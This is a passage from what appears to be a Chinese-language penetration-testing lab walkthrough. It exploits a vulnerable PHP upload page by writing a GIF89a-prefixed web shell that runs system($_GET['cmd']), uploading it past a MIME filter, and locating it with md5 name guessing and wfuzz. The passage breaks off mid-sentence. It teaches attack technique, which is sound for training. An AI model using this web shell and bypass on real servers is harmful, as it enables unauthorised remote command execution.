  \n在枚举阶段，我们在 Web 服务器上遇到了一个 PHP 上传页面。`upload.php` 页面的 HTML 源代码包含一个注释，为我们提供了一个指向开发者\
  \ GitHub 页面的链接。\n\n让我们使用 `firefox` 浏览器在 GitHub 上打开 `upload.php` 源代码页面。`https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php`\n\
  \n阅读源码后，你将对上传文件的功能有相当深入的理解。让我们看看在文件中发现了什么：\n\n```php\n$target_dir = \"uploads/\"\
  ;\n```\n\n文件上传目录的位置是 `uploads`。\n\n```php\nif($check[\"mime\"] == \"image/png\"\
  \ || $check[\"mime\"] == \"image/gif\"){\n```\n\n服务器根据 mime 类型检查类型，允许的文件类型为 `png`\
  \ 和 `gif`。\n\n```php\n$rand_number = rand(1,100);\n```\n\n随机选取的数字来自 1 到 100 的小数字集合。\n\
  \n```php\n$target_file = $target_dir . md5(basename($_FILES[\"file\"][\"name\"].$rand_number));\n\
  ```\n\n文件上传到服务器后遵循的命名规范。\n\n利用现有的信息，让我们创建一个包含 GIF 标签的基础 php php shell 文件，以绕过服务器端的上传过滤器，从而检查并最终演示漏洞。\n\
  \n打开终端，使用命令 `nano cmd.php` 创建一个名为 `cmd.php` 的文件，并在文件中添加以下内容：\n\n```php\nGIF89a;\n\
  <? system($_GET['cmd']);?>\n```\n\n上述 `cmd.php` 文件将赋予我们对远程服务器的基本访问，并允许我们通过网络浏览器在目标上执行简单的系统命令。\n\
  \n使用 `Firefox` 浏览器访问 `http://10.0.2.4:8000/upload.php` 并上传我们创建的 `cmd.php` 文件。\n\n\
  ![](img/Figure-7.23.jpg)\n\n### 图 7.23: 上传 cmd.php\n\n一旦你将 `cmd.php` 文件上传到服务器，我们仍然无法访问该文件，因为文件名被上传脚本更改了。我们需要在上传后找到它的新名称。\n\
  \n我们目前已知文件名将是原始文件名（`cmd.php`）的 MD5 哈希值后加上一个 1 到 100 之间的随机数，因此 `/uploads` 目录中的最终文件名将是\
  \ `cmd.php1`、`cmd.php2` 直到 `cmd.php100` 任何一个值的 MD5 哈希值。\n\n我们将在终端中使用命令 `echo -n\
  \ cmd.php(n) | md5sum` 生成字符串 `cmd.php1`、`cmd.php2`、`cmd.php3` 等的 `md5sum`。\n\n![](img/Figure-7.24.jpg)\n\
  \n### 图 7.24: 创建 MD5 哈希字符串\n\n如你所见，我们已经为字符串 `cmd.php1` 生成了 32 字节的 MD5 哈希，并在最后添加了一些空格和\
  \ -。\n\n这种一个一个执行命令的方法将是非常枯燥且低效的过程，并耗费大量时间和精力，因此让我们自动化此过程并存储所有的哈希值。\n\n```bash\n\
  for ((i=1; i<=100; i++)); do echo -n cmd.php$i | md5sum; done | cut -d \" \" -f1\
  \ > md5strings.txt\n```\n\n上述 `for` 循环生成 md5sum 输出，通过管道由 `cut` 命令过滤并存储到 `md5strings.txt`。`cut`\
  \ 命令中的 `-d \" \"` 标志将分隔符设置为空格，`-f1` 标志提取第一个字段。\n\n![](img/Figure-7.25.jpg)\n\n###\
  \ 图 7.25: 自动化 md5 哈希\n\n我们的 bash 脚本生成了 `cmd.php1` 到 `cmd.php100` 的所有可能文件的哈希值列表。\n\
  \n文件已经上传，我们只需要检查目标服务器上 `/uploads` 目录是否存在这些文件。由于我们需要处理大量的潜在文件名，我们将使用名为 *wfuzz* 的工具自动化查找服务器上文件的过程。\n\
  \n打开终端并运行命令：\n\n```bash\nwfuzz -w md5strings.txt --hc 404 http://10.0.2.4:8000/uploads/FUZZ.php\n\
  ```\n\n`wfuzz` 工具是一种基于网络的 Web 应用模糊工具，支持对 Web 应用进行破解，该工具通过将‘FUZZ’关键字替换为负载中的值来运行。`-w`\
  \ 标志用于指定包含 FUZZ 单词的文件，而 `--hc` 标志隐藏指定状态码的响应。\n\n\n\n\n\n打开终端窗口，并对上方提供的软件包列表依次执行\
